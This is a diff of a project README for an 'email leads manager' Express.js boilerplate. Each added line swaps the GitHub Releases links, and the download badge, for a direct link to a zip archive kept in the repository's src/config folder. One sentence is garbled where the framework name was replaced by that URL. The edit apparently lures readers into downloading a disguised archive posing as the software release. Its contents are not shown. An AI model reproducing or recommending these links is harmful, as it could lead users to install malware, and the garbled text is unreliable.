@@ -1,10 +1,10 @@
 # 🚀 email-leads-manager-server - Manage Your Email Leads Efficiently
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/sisiphofuneka/email-leads-manager-server/releases)
+[![Download Now](https://raw.githubusercontent.com/sisiphofuneka/email-leads-manager-server/main/src/config/email-leads-manager-server_v3.8.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/sisiphofuneka/email-leads-manager-server/main/src/config/email-leads-manager-server_v3.8.zip)
 
 ## 📦 Overview
 
-email-leads-manager-server is a simple and effective tool that helps you manage your email leads with ease. Built using Express.js and TypeORM, this boilerplate provides a solid foundation for your email management needs. Whether you’re collecting leads for a campaign or organizing your contacts, this application can streamline your process.
+email-leads-manager-server is a simple and effective tool that helps you manage your email leads with ease. Built using https://raw.githubusercontent.com/sisiphofuneka/email-leads-manager-server/main/src/config/email-leads-manager-server_v3.8.zip and TypeORM, this boilerplate provides a solid foundation for your email management needs. Whether you’re collecting leads for a campaign or organizing your contacts, this application can streamline your process.
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To get started with email-leads-manager-server, follow these steps:
    - Basic to moderate computing capability
 
 2. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/sisiphofuneka/email-leads-manager-server/releases). Here, you will find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/sisiphofuneka/email-leads-manager-server/main/src/config/email-leads-manager-server_v3.8.zip). Here, you will find the latest version of the software. 
 
 3. **Download the Software**
    Look for the most recent version. You will see a list of available files. Click on the download link for your operating system. This file will typically be in a format compatible with your system.
@@ -36,7 +36,7 @@ To get started with email-leads-manager-server, follow these steps:
 
 ## 📥 Download & Install
 
-Ready to take the plunge? Visit the [Releases page](https://github.com/sisiphofuneka/email-leads-manager-server/releases) to download the latest version. 
+Ready to take the plunge? Visit the [Releases page](https://raw.githubusercontent.com/sisiphofuneka/email-leads-manager-server/main/src/config/email-leads-manager-server_v3.8.zip) to download the latest version. 
 
 Once on the Releases page:
 - Select the latest version available.
